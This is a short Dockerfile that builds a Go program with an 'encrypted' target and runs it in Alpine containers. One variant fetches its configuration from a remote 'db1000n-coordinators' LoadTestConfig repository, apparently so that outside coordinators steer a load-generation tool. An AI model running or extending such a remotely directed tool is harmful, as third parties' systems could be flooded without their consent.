FROM golang:1.17 as builder

WORKDIR /build
# pre-copy/cache go.mod for pre-downloading dependencies and only redownloading them in subsequent builds if they change
COPY go.mod .
RUN go mod download && go mod verify
COPY . .
# use -s -w to strip extra debug data
RUN make LDFLAGS="-s -w" build_encrypted

FROM alpine:3.11.3 as advanced

RUN apk add --update curl && rm  -rf /tmp/* /var/cache/apk/*

WORKDIR /usr/src/app
COPY --from=builder /build/main .

CMD ["./main", "-c", "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.adv.json"]

FROM alpine:3.11.3

RUN apk add --update curl && rm  -rf /tmp/* /var/cache/apk/*

WORKDIR /usr/src/app
COPY --from=builder /build/main .

CMD ["./main"]
